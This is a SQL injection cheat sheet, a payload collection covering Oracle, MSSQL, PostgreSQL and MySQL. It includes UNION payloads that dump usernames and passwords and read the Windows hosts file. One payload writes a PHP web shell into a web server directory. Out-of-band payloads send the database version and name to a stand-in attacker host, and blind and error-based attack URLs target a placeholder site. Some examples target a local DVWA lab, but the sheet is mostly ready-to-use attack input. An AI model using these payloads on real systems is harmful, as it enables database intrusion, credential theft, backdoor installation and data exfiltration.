#### comments

| syntax | type |
|:---:|:---:|
|```--comment```|*oracle, microsoft, postgresql*|
|```-- comment```|*mysql*|
|```/*comment*/```|*microsoft, postgresql, mysql*|

-----


#### string concatenation

| syntax | type |
|:---:|:---:|
|```'foo'\|\|'bar'```|*oracle, postgresql*|
|```'foo'+'bar'```|*microsoft*|
|```'foo' 'bar'```|*mysql*|
|```CONCAT('foo','bar')```|*mysql*|

-----


#### version

| syntax | type |
|:---:|:---:|
|```SELECT version FROM v$instance```|*oracle*|
|```SELECT banner from v$instance```|*oracle*|
|```SELECT @@version```|*microsoft, mysql*|
|```SELECT version()```|*postgresql*|

```IF(MID(@@version,1,1) = '5', SLEEP(5), 0);```

-----


#### database contents

| syntax | type |
|:---:|:---:|
|```SELECT * FROM all_tables```|*oracle*|
|```SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'```|*oracle*|
|```SELECT * FROM information_schema.tables```|*microsoft, postgresql, mysql*|
|```SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'```|*microsoft, postgresql, mysql*|

-----


#### conditional errors

| syntax | type |
|:---:|:---:|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual```|*oracle*|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END```|*microsoft*|
|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END```|*postgresql*|
|```SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')```|*mysql*|

-----


#### time delays

| syntax | type |
|:---:|:---:|
|```dbms_pipe.receive_message(('a'),10)```|*oracle*|
|```WAITFOR DELAY '0:0:10'```|*microsoft*|
|```SELECT pg_sleep(10)```|*postgresql*|
|```SELECT sleep(10)```|*mysql*|

-----


#### union statements

*web app*

```SELECT first_name, last_name FROM users UNION SELECT username, password FROM login;```

*attack: http://localhost:81/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1%3B--*

```User ID: 1’ UNION SELECT 1;- -``` *no data different number of columns*

*attack: http://localhost:81/dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,2%3B--*

```User ID: 1’ UNION SELECT 1,2;- -``` *returns data (number of columns match)*

*load hosts file*

```union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6```

*write php backdoor*

```union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'```

-----


#### table/column enumeration

*extract list of tables*

```1' UNION SELECT 1,table_name FROM information_schema.tables;- -```

*extract column names*

```1' UNION SELECT 1,column_name FROM information_schema.columns;- -```

*concat and extract data*

```1' UNION SELECT 1,concat(user,':',password) FROM users;- -```

-----


#### out of band

*database version*

```1’;select load_file(concat('\\\\',version(),'.hacker.com\\s.txt'));```

*database name*

```1’;select load_file(concat('\\\\',database(),'.hacker.com\\s.txt'));```

-----


#### blind queries

*if not 'sa' wait for 10 seconds*

```http://target.com/page.asp?id=1;if+not(select+system_user)+<>+'sa'+waitfor+delay+'0:0:10'--```

-----


#### mssql

*error based, extract user*

```http://target.com/page.asp?id=1 or 1=convert(int,(USER))--```

*union based extract user (use null where data type not known, column number must match)*

```http://target.com/page.asp?id=null UNION SELECT ALL 1,USER,3,4--```

-----
